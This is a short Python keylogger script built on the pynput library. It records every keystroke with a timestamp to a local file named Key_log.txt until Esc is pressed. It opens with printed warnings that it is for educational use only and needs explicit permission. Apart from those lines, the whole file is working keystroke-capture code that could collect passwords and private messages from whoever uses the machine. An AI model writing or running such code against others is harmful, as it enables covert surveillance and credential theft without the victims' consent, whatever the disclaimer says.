print("WARNING: This keylogger is for EDUCATIONAL use only.")
print("Do not use it without explicit permission.")

from pynput.keyboard import Listener, Key
import logging

# Log file setup
log_file = "Key_log.txt"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")
        
def on_release(key):
    if key == Key.esc:
        print("ESC pressed. Exiting....")
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
